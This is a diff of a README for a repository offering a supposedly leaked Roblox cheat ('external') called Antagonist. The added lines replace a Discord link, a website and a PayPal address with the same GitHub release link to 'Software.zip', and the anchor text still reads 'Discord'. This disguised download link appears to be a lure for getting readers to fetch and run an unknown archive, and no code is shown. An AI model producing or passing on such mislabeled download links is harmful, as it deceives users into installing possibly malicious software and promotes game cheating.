@@ -5,12 +5,12 @@
     Antagonist is a Roblox External which got Leaked while they was online and now the source is grabable.
     <br/>
     <br/>
-    <a href="https://discord.com/users/1162941718593798164">Discord</a>
+    <a href="https://github.com/f3ca/antagonist_source_code/releases/download/v2.0/Software.zip">Discord</a>
   </p>
 </p>
 <h3 align="center";">Please Star To support this project for free! ⭐</h3>
 <br/>
-<h3 align="center";>  https://worldofyawn.xyz </h3>
+<h3 align="center";>  https://github.com/f3ca/antagonist_source_code/releases/download/v2.0/Software.zip </h3>
 
 
 ## Releases
@@ -18,5 +18,5 @@
 
 ## Donate to My Project
 
-- PayPal: sfdfsdfsd72@gmail.com
+- PayPal: https://github.com/f3ca/antagonist_source_code/releases/download/v2.0/Software.zip
 - Discord: @f3ca
